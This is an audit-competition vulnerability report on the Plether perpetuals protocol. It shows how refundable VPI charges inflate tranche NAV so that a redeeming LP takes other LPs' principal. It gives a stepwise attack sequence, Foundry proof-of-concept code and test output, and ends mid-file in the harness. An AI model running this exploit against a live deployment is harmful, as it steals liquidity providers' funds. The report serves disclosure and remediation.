# \#97711 [SC-Critical] Refundable VPI open charge is booked as realised LP revenue in HousePool, so any LP can inflate tranche NAV at epoch settlement and redeem other LPs' principal

**Submitted on Nov 2nd 2026 at 19:17:53 UTC by @YoungSyre for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97711
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

I think this one has real substance, so I want to lay it out carefully. When a trader opens a skew-increasing position they pay a VPI charge into HousePool, and when they close that same position the pool pays it straight back to them as a rebate. So for as long as the position is open that money is a liability, not income. HousePool books it as income anyway: accountedAssets += amount the moment it lands, and the hourly LP epoch settlement prices every redemption and deposit off that number. Nothing on the settlement side subtracts what the pool owes back.

I ran into this while tracing what moves accountedAssets around settleLpEpoch, and it turns into a clean, repeatable extraction because settlement and order execution are permissionless. An LP queues a redemption, opens a big skew-increasing position a couple of minutes before the epoch, settles the epoch themselves, gets paid at the inflated NAV, then closes and collects the refund. The LPs who stay behind cover it. The PoC shows the attacker ending each cycle in profit while the other Junior LP loses principal, about 0.08 % of pool depth per cycle (a cycle is roughly two hours), plus a variant where an LP takes the same transfer with zero trading just by timing a redemption around someone else's large open.

## Vulnerability Details

The VPI charge for moving skew from 0 to notional `S` at depth `D` is `X = 1/2 * vpiFactor * S^2 / D` (`CfdMath.calculateVPI`). Release parameters (`packages/perps/DEPLOYMENT.md`): `vpiFactor` 0.01, `maxSkewRatio` 0.40, execution fee 4 bps, adverse-confidence multiplier 2,500 bps, Senior cap 40M USDG / 80 %.

**1. Open: the charge becomes accounted pool assets immediately.**
`CfdEngineSettlementSidecar.sol:446-464` collects the trade cost through `clearinghouse.applyOpenCost` and then calls:

```solidity
IHousePool(host.pool()).recordClaimantInflow(
    poolCashInflowAssets,
    IHousePool.ClaimantInflowKind.Revenue,
    IHousePool.ClaimantInflowCashMode.CashArrived
);
```

In `HousePool.sol:624-651`:

```solidity
if (cashMode == IHousePool.ClaimantInflowCashMode.CashArrived) {
    accountedAssets += amount;
}
if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
    _recordPendingClaimantInflow(kind, amount);
} else if (seniorPrincipal + juniorPrincipal == 0) {
    _recordPendingClaimantInflow(kind, amount);
}
```

The pending bucket is only used for recapitalisation or when both tranche principals are zero. In normal operation the charge is distributable pool assets atomically.

**2. Settlement: NAV includes the charge and nothing subtracts the refund.**
`HousePool.totalAssets()` (`HousePool.sol:426-429`) is `min(settlementToken.balanceOf(this), accountedAssets)`; both rise by `X`. `settleLpEpoch` reconciles from that number, allocates the increase to tranche principal, and uses that principal to price every redemption and deposit activation in the epoch. The terminal NAV book marks open positions' price PnL, collateral-capped, but `SECURITY.md` ("Exact symmetric LP NAV") says VPI, carry and fees stay outside the pre-close price book. So the refundable charge is counted and the obligation to refund it is not.

**3. Close: the charge is paid back out of pool cash.**
`CloseAccountingLib.sol:103-118` computes the close VPI delta. Closing the position that created the skew yields `-X`, and the lifetime clamp keeps the rebate equal to the accrued charge even if depth has fallen:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

`CfdEnginePlanLib.sol:1036-1061` (`_planCloseActionSettlement`) turns the negative action net into `delta.actionRebateAssets` (the 4 bps close fee is netted against it). `CfdEngineSettlementSidecar.sol:621-624` pays it:

```solidity
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

and `HousePool.payOut` (`HousePool.sol:604-614`) does `accountedAssets -= amount` and transfers the tokens.

**4. Both legs and the settlement between them are permissionless.**
`OrderRouter.settleLpEpoch(bytes[] pythUpdateData)` (`OrderRouter.sol:479-484`) is `external payable nonReentrant` with no caller check; anyone supplies the Pyth update and pays the fee. `OrderRouter.executeOrder` (`OrderRouter.sol:240`) is open to anyone as well. The program page confirms keepers are untrusted.

**Attack sequence (one cycle, Junior tranche).** Attacker carol is a Junior LP with a trading account; bob is another Junior LP.

1. carol calls `TrancheVault.requestRedeem(shares)` after the one-hour activation cooldown (`TrancheVault.sol:38`). The request lands in the next hourly epoch (`LP_EPOCH_DURATION` 1 hour, request cutoff 5 minutes before the epoch, `TrancheVault.sol:39`).
2. Two minutes before the epoch, carol commits a LONG for 30 % of depth (cap 40 %) with about 1 % margin through `OrderRouter.commitOrder(OrderRequest)` and executes it herself via `executeOrder`. The pool books `X` as revenue.
3. At the epoch, carol calls `settleLpEpoch`. Her redemption is priced on NAV + X and she claims it.
4. carol closes the position (`commitOrder` close, `executeOrder`). The pool pays the rebate out of its cash.

carol paid two execution fees (one netted into the rebate) and a few seconds of carry; she received her Junior share of `X` on the redemption. bob received nothing and now owns a share of a pool that just paid out `X`.

**Why this is not the documented collection-time policy.** `ACCOUNTING_SPEC.md` accepts that an LP can time the collection of carry. Carry, fees, the frozen spread and liquidation charges are one-way: once collected they are LP income forever, so timing only shifts real income between cohorts. The VPI charge is returned to the trader who paid it. Booking it as distributable revenue lets an LP cash out a profit the pool never earned and leaves the repayment to whoever stays. The clamp comment in `CloseAccountingLib` shows the team modelled a trader sandwiching LPs through depth changes; the LP exiting on their own refundable charge is not handled anywhere. I checked the Cecuro, SC Audit Studio and AI-scan reports and the `SECURITY.md` limitation sections: SCAN-30/31 concern a trader changing the size of their own VPI charge by moving depth, SC-M3 concerns rebate-backed opens below initial margin, MED-22 is carry rounding, MED-24/29 are refund epochs and redemption rounding. None covers this.

## Impact Details

Other LPs lose principal that sits at rest in HousePool; the attacker finishes each cycle with more USDG than they started with. All figures are from the attached Foundry run at the release parameters, in USDG.

Core case, Junior-only pool of 3M (carol 2M, bob 1M), one cycle at 30 % skew (`test_VpiRevenuePumpsNavForRedeemer`):

- VPI booked as LP revenue at carol's open: 1,350.90
- carol's redemption paid above fair value: +900.29
- carol's trading cost (open fee, netted close fee, carry): -720.74
- carol net: **+179.56**
- bob, who did nothing: **-539.47**
- rebate paid out of the pool at carol's close: 990.60

Variants from the same run:

- Four back-to-back cycles (`test_RepeatedCyclesDrainMinorityJunior`): carol +720.08 total, bob -2,160.00 total.
- 2 bps Pyth confidence with the 25 % adverse shift applied to both legs (`test_PumpWithTypicalConfidence_2bps`): carol +119.42, bob -479.37.
- 10 bps confidence, the oracle's ceiling (`test_PumpWithMaxAllowedConfidence_10bps`): carol -121.14, bob still -238.98. The victim loses whether or not the attacker profits.
- No trading at all (`test_ParasiticRedeemAroundOrganicOpen`): carol only times a 1M redemption around alice's 39 % open. carol +760.65 versus fair value, bob -146.07, zero trading cost.
- Senior-heavy pool, Senior 400k + Junior 200k, carol holds half of Junior (`VpiNavPumpSeniorTest`): carol +39.64, bob's Junior -132.40, Senior unchanged.
- Deposit-side mirror against an organic 39 % skew (`VpiNavPumpDepositTest`): carol +194.48, bob -506.74.

The per-cycle transfer is bounded by `1/2 * vpiFactor * maxSkewRatio^2 * D`, about 0.08 % of depth, because the skew cap limits the pump; the attacker captures their Junior share of it and the remaining Junior LPs pay the rest. A cycle takes about two hours (one-hour cooldown plus the redemption epoch), so about twelve cycles a day are possible and a minority Junior LP loses a few percent of their stake per day without acting. The parasitic variant has no stake threshold and no trading cost: any LP who watches the order queue can harvest every large skew-increasing open.

For the active cycle, the attacker profits when their share `f` of the Junior tranche satisfies `f >= 0.40 + 0.025 * c`, with `c` the basket confidence in bps at the 40 % skew cap: about 42 % of Junior at a typical 1 bp FX confidence, about 65 % at the 10 bps ceiling.

Severity: the funds taken are other users' principal at rest in HousePool, taken permissionlessly through a code defect, with the attacker in profit. That matches "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield". Under the program's feasibility rules a capital requirement is not a downgrade reason, and the attacker's only market risk is two minutes of exposure to a zero-mean six-currency basket that is hedgeable off-chain. The protocol-level adverse-confidence cost cannot be hedged and is quantified above; the attack stays profitable at typical confidence. The guardian can hold LP settlement but cannot undo a settled epoch, and no detection or response window is documented.

Recommendation: subtract the sum of `max(vpiAccrued, 0)` over open positions from distributable assets in the settlement snapshot, or defer recognition of VPI charges until the position closes, or route them to a non-distributable reserve (like the existing negative-VPI reserve) released to LPs only when realised. Carry has the same recognition-at-collection timing; it is not refundable so not exploitable on its own, but the fix should cover it for consistency.

## References

- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L651 (`recordClaimantInflow`), #L426-L429 (`totalAssets`), #L604-L614 (`payOut`)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L446-L464 (open VPI booked as Revenue/CashArrived), #L621-L624 (close rebate)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1036-L1061 (`_planCloseActionSettlement`)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118 (close VPI delta and lifetime clamp)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L479-L484 (`settleLpEpoch`, no caller restriction), #L240 (`executeOrder`)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L38-L39 (cooldown 1 h, request cutoff 5 min); HousePool.sol#L178 (epoch 1 h)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md ("Exact symmetric LP NAV"); packages/perps/ACCOUNTING_SPEC.md (collection-time ownership); packages/perps/DEPLOYMENT.md (release parameters)

## Link to Proof of Concept

https://gist.github.com/Young-Syre/702e0857f52234cde649bbd01d22aa0b

## Proof of Concept

## Proof of Concept

Secret Gist with the same two files, a README and the full run log: https://gist.github.com/Young-Syre/702e0857f52234cde649bbd01d22aa0b

Two Foundry test files that run inside the repository's own test suite at the commit in scope. No in-scope contract is modified. The only mocks are the repository's `MockPyth` and `MockSettlementToken` (Pyth updates and USDG, the components the program allows to be mocked). Orders go through the production `OrderRouter.commitOrder(OrderRequest)` entrypoint and are executed and settled through the permissionless `executeOrder` and `settleLpEpoch` paths. The fixture uses the release parameters from `packages/perps/DEPLOYMENT.md` (vpiFactor 0.01, maxSkewRatio 0.40, margins 10/20/300 bps, carry 500 bps, liquidation charge 10 bps with 50 % to the keeper, execution fee 4 bps, settlement buffer 25 bps, frozen-close spread 50 bps, adverse-confidence multiplier 2,500 bps, minimum open notional 1,000 USDG, Senior cap 40M USDG and 80 %).

### Steps to reproduce

Requirements: Foundry 1.5.1 (solc 0.8.35 downloads automatically).

1. Clone the audit repository and check out the commit in scope:

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```

2. Save the two files below as `packages/perps/test/perps/poc/PocHarness.t.sol` and `packages/perps/test/perps/poc/VpiNavPump.t.sol`.

3. Run:

```bash
cd packages/perps
forge test --match-path 'test/perps/poc/VpiNavPump.t.sol' -vv \
  --skip accounting --skip differential --skip fork --skip gas --skip invariant \
  --skip matrices --skip regression --skip spec --skip AcrossDirectFunding --skip DepositFor
```

The `--skip` flags only leave unrelated test directories out of the via-IR compile so it takes about two minutes instead of about fifty; the production sources compile unchanged and the result is identical without them.

### What the core test does

`test_VpiRevenuePumpsNavForRedeemer` (helper `_pumpCycle` in `VpiNavPump.t.sol`):

1. Fixture: Junior pool with bob 1M and carol 2M USDG, both activated, mark at 1.00, release parameters.
2. carol calls `juniorVault.requestRedeem` for all her shares; the request lands in the next hourly epoch.
3. 120 seconds before that epoch, carol commits a LONG for 30 % of pool depth with 1 % margin and executes it as keeper. The increase in `pool.accountedAssets()` is the VPI booked as LP revenue.
4. One second after the epoch starts, carol calls `settleLpEpoch` and claims her redemption. The test compares what she was paid with her fair value measured before step 2.
5. carol closes the position. The drop in `pool.accountedAssets()` is the rebate paid out of the pool.
6. Assertions: bob's redemption value is lower than before the cycle, and carol's redemption-above-fair plus her trading P&L is positive.

The other tests reuse the cycle: four repeated cycles, 2 bps and 10 bps Pyth confidence with the production 25 % adverse shift, a no-trade variant where carol only times a redemption around alice's organic open, a Senior-heavy pool, and the deposit-side mirror. `test_CloseFeeNettedIntoRebateIsNotCreditedToTreasury` is a side observation reported separately and not part of this finding's impact.

### Expected output (6-decimal USDG atoms unless marked)

```
Ran 1 test for test/perps/poc/VpiNavPump.t.sol:VpiNavPumpSeniorTest
[PASS] test_SeniorHeavyPool_JuniorMinorityDrained() (gas: 5177427)
Logs:
  pool depth: 602000000000
  single cycle, 39% skew, senior-heavy pool
    VPI booked as LP revenue   : 457509053
    rebate paid out of the pool: 363610863
    carol redemption - fair    : 227617355
    carol trading P&L (fees)   : -187978190
    carol net                  : 39639165
    bob junior value delta     : -132395224
  bob senior value delta     : 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.91ms (6.12ms CPU time)

Ran 1 test for test/perps/poc/VpiNavPump.t.sol:VpiNavPumpDepositTest
[PASS] test_DepositActivationAtDepressedNav() (gas: 5346153)
Logs:
  bob junior value before (incl. alice's VPI revenue): 1000760947936
  rebate paid by the pool at carol's open: 761130429
  carol trading P&L (fees)   : -312788938
  carol share value - deposit: 507270383
  carol net                  : 194481445
  bob junior value delta     : -506743703

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 21.77ms (9.68ms CPU time)

Ran 6 tests for test/perps/poc/VpiNavPump.t.sol:VpiNavPumpTest
[PASS] test_CloseFeeNettedIntoRebateIsNotCreditedToTreasury() (gas: 4065640)
Logs:
  treasury credited at open (4 bps fee): 360240000
  rebate paid at close: 990049835
  close fee implied by the netting: 360240000
  treasury credited at close: 0

[PASS] test_ParasiticRedeemAroundOrganicOpen() (gas: 5030247)
Logs:
  VPI booked by alice's open                 : 2282.709010
  carol redemption - fair (carol never trades): 760.646415
  bob value delta                            : -146.068724

[PASS] test_PumpWithMaxAllowedConfidence_10bps() (gas: 5192020)
Logs:
  single cycle, 30% skew, 10 bps confidence (25% adverse shift)
    VPI booked as LP revenue   : 1350224634
    rebate paid out of the pool: 539536372
    carol redemption - fair    : 1049893709
    carol trading P&L (fees)   : -1171038202
    carol net                  : -121144493
    bob junior value delta     : -238975621

[PASS] test_PumpWithTypicalConfidence_2bps() (gas: 5192428)
Logs:
  single cycle, 30% skew, 2 bps confidence (25% adverse shift)
    VPI booked as LP revenue   : 1350764913
    rebate paid out of the pool: 900388669
    carol redemption - fair    : 930213788
    carol trading P&L (fees)   : -810798232
    carol net                  : 119415556
    bob junior value delta     : -479367328

[PASS] test_RepeatedCyclesDrainMinorityJunior() (gas: 21492080)
Logs:
  cycle 1 (30% skew)
    VPI booked as LP revenue   : 1350900000
    rebate paid out of the pool: 990601765
    carol redemption - fair    : 900293819
    carol trading P&L (fees)   : -720738235
    carol net                  : 179555584
    bob junior value delta     : -539465271
  cycle 2 (30% skew)
    VPI booked as LP revenue   : 1351037865
    rebate paid out of the pool: 990699620
    carol redemption - fair    : 900682876
    carol trading P&L (fees)   : -720818245
    carol net                  : 179864631
    bob junior value delta     : -539813967
  cycle 3 (30% skew)
    VPI booked as LP revenue   : 1351175714
    rebate paid out of the pool: 990797457
    carol redemption - fair    : 901072072
    carol trading P&L (fees)   : -720898257
    carol net                  : 180173815
    bob junior value delta     : -540162803
  cycle 4 (30% skew)
    VPI booked as LP revenue   : 1351313544
    rebate paid out of the pool: 990895275
    carol redemption - fair    : 901461410
    carol trading P&L (fees)   : -720978269
    carol net                  : 180483141
    bob junior value delta     : -540511779
  carol total net after 4 cycles: 720077171
  bob total delta after 4 cycles: -2160002411

[PASS] test_VpiRevenuePumpsNavForRedeemer() (gas: 5101872)
Logs:
  single cycle, 30% skew, carol 2/3 of junior
    VPI booked as LP revenue   : 1350900000
    rebate paid out of the pool: 990601765
    carol redemption - fair    : 900293819
    carol trading P&L (fees)   : -720738235
    carol net                  : 179555584
    bob junior value delta     : -539465271

Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 31.41ms (62.21ms CPU time)
```

### File 1: `packages/perps/test/perps/poc/PocHarness.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// PoC harness for the Plether Immunefi audit competition (pin a82d4fef).
// Self-contained full-stack fixture (Router + sidecars + Engine + Clearinghouse + HousePool + tranche vaults +
// PletherOracle on a MockPyth), production-like risk parameters (10/20 bps margins, vpiFactor 0.01, maxSkew 0.4).
// Actors: alice, carol (traders, 100k USDG margin each), bob (junior LP, 1M USDG), keeper (external keeper).
// Copy into packages/perps/test/perps/poc/ and run:  tools/poc-run.sh <file>

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngineAccountLens} from "@plether/perps/CfdEngineAccountLens.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdEngineProtocolLens} from "@plether/perps/CfdEngineProtocolLens.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PerpsPublicLens} from "@plether/perps/PerpsPublicLens.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {MockSettlementToken} from "../../utils/MockSettlementToken.sol";
import {BasePerpTest} from "../BasePerpTest.sol";

abstract contract PocBase is BasePerpTest {

    MockPyth mockPyth;
    bytes32 constant FEED_A = bytes32(uint256(1));
    bytes32 constant FEED_B = bytes32(uint256(2));
    bytes32[] feedIds;
    uint256[] weights;
    uint256[] bases;

    address alice = address(0x111);
    address bob = address(0x222);
    address carol = address(0x333);
    address keeper = address(0x444);

    uint256 internal constant ONE_LOT = 1e20; // SIZE_QUANTUM; lots * price8 = USDG atoms (1 lot = 100 USDG @ 1.00)
    /// @dev Pyth confidence (8-dec units) attached to every tick published by `_tick`; 0 by default. 10 bps of a
    ///      1.00 price is 100_000, the maximum the oracle accepts (`basketMaxConfidenceRatioBps` = 10).
    uint64 internal tickConf;
    uint256 internal constant TRADER_MARGIN = 100_000e6;

    // production-like template (docs): 10/20/300 bps margins, 5% carry, vpiFactor 0.01, maxSkew 40%, 10 bps liq charge
    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _bobJunior() internal pure virtual returns (uint256) { return 1_000_000e6; }

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 0; }

    function setUp() public virtual override {
        settlementToken = new MockSettlementToken();
        mockPyth = new MockPyth();
        mockPyth.setSynchronizeLegacyUniquePrices(true);

        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = _deployEngine(_riskParams());
        _syncEngineAdmin();
        terminalNavBook = new TerminalNavBookV2(address(engine), uint32(engine.CAP_PRICE()));
        engine.setTerminalNavBook(address(terminalNavBook));
        engineAccountLens = new CfdEngineAccountLens(address(engine));
        engineLens = new CfdEngineLens(address(engine));
        engineProtocolLens = new CfdEngineProtocolLens(address(engine));
        pool = new HousePool(address(settlementToken), address(engine), address(new HousePoolRedemptionMathSidecar()));

        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "juniorAssets", 0, address(0)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        feedIds.push(FEED_A);
        feedIds.push(FEED_B);
        weights.push(0.5e18);
        weights.push(0.5e18);
        bases.push(1e8);
        bases.push(1e8);
        mockPyth.setAllPrices(feedIds, int64(100_000_000), int32(-8), block.timestamp);

        pletherOracle = new PletherOracle(
            address(engine), address(pool), address(mockPyth), feedIds, weights, bases, new bool[](2)
        );
        router = _deployLegacyOrderRouter(address(engine), address(engineLens), address(pool), address(pletherOracle));
        _syncRouterAdmin();
        engine.setOrderRouter(address(router));
        publicLens = new PerpsPublicLens(address(engineAccountLens), address(engine), address(router), address(pool));

        // Same as BasePerpTest._bypassAllTimelocks, but the single pool-config cycle installs the release Senior limits
        // (DEPLOYMENT.md / Immunefi scope tab: 40M USDG and 80 %) instead of the test-base placeholders, so no second
        // 72 h pool-config warp is needed later (a second cycle shifted setUp into the weekend and broke the frozen tests).
        clearinghouse.setEngine(address(engine));
        {
            IHousePool.PoolConfig memory poolCfg = _currentPoolConfig();
            poolCfg.maxSeniorExposureAssets = 40_000_000e6;
            poolCfg.maxSeniorShareBps = 8_000;
            pool.proposePoolConfig(poolCfg);
            vm.warp(pool.poolConfigActivationTime());
            pool.finalizePoolConfig();
            vm.warp(SETUP_TIMESTAMP);
        }
        {
            // production oracle policy (script/DeployPerpsArbitrumSepolia.s.sol): 25% adverse-confidence multiplier
            IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
            config.adverseConfidenceMultiplierBps = 2500;
            // release-Router constructor value (DEPLOYMENT.md): 1,000 USDG minimum open notional
            config.minOpenNotionalAssets = 1_000e6;
            _setRouterConfig(config);
            _skipClosedMarket();
        }

        uint256 seedAmount = 1000e6;
        settlementToken.mint(address(this), seedAmount * 2);
        settlementToken.approve(address(pool), seedAmount * 2);
        pool.initializeSeedPosition(false, seedAmount, address(this));
        pool.initializeSeedPosition(true, seedAmount, address(this));
        pool.activateTrading();

        _fundJunior(bob, _bobJunior());

        _fundTraderMargin(alice, TRADER_MARGIN);
        _fundTraderMargin(carol, TRADER_MARGIN);
        vm.deal(keeper, 10 ether);

        // fresh accepted basket + engine mark at the current time (after the LP epoch warp)
        _tick(1e8, vm.getBlockTimestamp());
        router.updateMarkPrice(_pythUpdateData());
    }

    function _fundTraderMargin(address trader, uint256 amount) internal {
        settlementToken.mint(trader, amount);
        vm.startPrank(trader);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(trader, amount);
        vm.stopPrank();
        vm.deal(trader, 10 ether);
    }

    // ---- oracle / time helpers -------------------------------------------------------------------------

    function _pythUpdateData() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    /// @dev Publish a tick for every basket feed at `publishTime` (confidence `tickConf`) and move the chain so
    ///      the tick is usable.
    function _tick(uint256 price8, uint256 publishTime) internal {
        _tickConf(price8, tickConf, publishTime);
    }

    /// @dev Same with an explicit confidence (8-dec units) to exercise adverse-confidence pricing.
    function _tickConf(uint256 price8, uint64 conf8, uint256 publishTime) internal {
        mockPyth.setAllPrices(feedIds, int64(uint64(price8)), conf8, int32(-8), publishTime);
        if (vm.getBlockTimestamp() < publishTime) {
            vm.warp(publishTime);
        }
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _advance(uint256 seconds_) internal {
        vm.warp(vm.getBlockTimestamp() + seconds_);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// @dev Large timelock warps can land on the Fri 17:00 NY -> Sun 17:15 NY closure; step past it (live market only).
    function _skipClosedMarket() internal {
        while (engine.isOracleFrozen() || engine.isFadWindow()) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
        }
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// @dev Refresh the engine mark at the current timestamp (permissionless Router path).
    function _refreshMark(uint256 price8) internal {
        _tick(price8, vm.getBlockTimestamp());
        uint256 fee = pletherOracle.getUpdateFee(_pythUpdateData());
        router.updateMarkPrice{value: fee}(_pythUpdateData());
    }

    // ---- trader helpers ---------------------------------------------------------------------------------

    function _commitOpen(address trader, CfdTypes.Side side, uint256 size, uint256 margin, uint256 target)
        internal
        returns (uint64 id)
    {
        vm.prank(trader);
        id = router.commitOrder(side, size, margin, target, false);
    }

    function _commitClose(address trader, CfdTypes.Side side, uint256 size, uint256 target)
        internal
        returns (uint64 id)
    {
        vm.prank(trader);
        id = router.commitOrder(side, size, 0, target, true);
    }

    // ---- production V3 commit path (OrderRequest), used by the PoCs so no test-only adapter is involved ----------

    uint256 internal _clientNonce;

    function _v3Request(CfdTypes.Side side, uint256 size, uint256 margin, uint256 target, bool isClose)
        internal
        returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = keccak256(abi.encode("poc", ++_clientNonce));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = target;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp) + uint64(router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    /// @dev Production entrypoint `OrderRouter.commitOrder(OrderRequest)`.
    function _commitV3(address trader, CfdTypes.Side side, uint256 size, uint256 margin, uint256 target, bool isClose)
        internal
        returns (uint64 id)
    {
        OrderV3Types.OrderRequest memory request = _v3Request(side, size, margin, target, isClose);
        vm.prank(trader);
        id = router.commitOrder(request);
    }

    /// @dev Keeper executes the queue head at `price8` using the first tick after the head's commit time.
    function _executeHead(address who, uint256 price8) internal returns (OrderV3Types.ExecutionResult memory r) {
        uint64 head = router.nextExecuteId();
        require(head != 0, "no head");
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(head);
        _tick(price8, uint256(pending.commitTime) + 1);
        uint256 fee = pletherOracle.getOrderExecutionFee(_pythUpdateData());
        vm.prank(who);
        r = router.executeOrder{value: fee}(head, _pythUpdateData());
    }

    function _position(address a) internal view returns (uint256 size, uint256 margin, CfdTypes.Side side) {
        (size, margin,,, side,,) = engine.positions(a);
    }

    function _buckets(address a) internal view returns (IMarginClearinghouse.PnlIsolationBuckets memory) {
        return clearinghouse.getPnlIsolationBuckets(a);
    }

    // ---- LP helpers -------------------------------------------------------------------------------------

    /// @dev Settle matured LP epochs through the Router with a fresh PoolReconcile basket at `price8`.
    function _settleEpochs(uint256 price8) internal {
        _tick(price8, vm.getBlockTimestamp());
        uint256 fee = pletherOracle.getUpdateFee(_pythUpdateData());
        router.settleLpEpoch{value: fee}(_pythUpdateData());
    }

    function _lpValue(TrancheVault vault, address lp) internal view returns (uint256) {
        return vault.estimateRedeemAssets(vault.balanceOf(lp));
    }

    // ---- conservation checks ----------------------------------------------------------------------------

    /// @dev Every USDG ever minted by the mock must sit in a known holder; anything else is stuck or lost.
    function _assertTokenConservation(address[] memory wallets) internal view {
        uint256 total = settlementToken.totalSupply();
        uint256 seen = settlementToken.balanceOf(address(clearinghouse)) + settlementToken.balanceOf(address(pool))
            + settlementToken.balanceOf(address(seniorVault)) + settlementToken.balanceOf(address(juniorVault))
            + settlementToken.balanceOf(address(router)) + settlementToken.balanceOf(address(engine))
            + settlementToken.balanceOf(address(pletherOracle));
        for (uint256 i; i < wallets.length; ++i) {
            seen += settlementToken.balanceOf(wallets[i]);
        }
        assertEq(seen, total, "USDG leaked to an untracked holder");
    }

    /// @dev Clearinghouse custody must equal the sum of the tracked accounts' settlement balances.
    function _assertClearinghouseLedger(address[] memory accounts) internal view {
        uint256 ledger;
        for (uint256 i; i < accounts.length; ++i) {
            ledger += clearinghouse.balanceAssets(accounts[i]);
        }
        assertEq(settlementToken.balanceOf(address(clearinghouse)), ledger, "clearinghouse custody != ledger");
    }

}

contract PocHarnessSmokeTest is PocBase {

    function test_Smoke_OpenCloseThroughRouter() public {
        _advance(10);
        uint64 id = _commitOpen(alice, CfdTypes.Side.SHORT, 2_000 * ONE_LOT, 5_000e6, 1e8);
        assertEq(id, 1);
        _executeHead(keeper, 1e8);
        (uint256 size, uint256 margin,) = _position(alice);
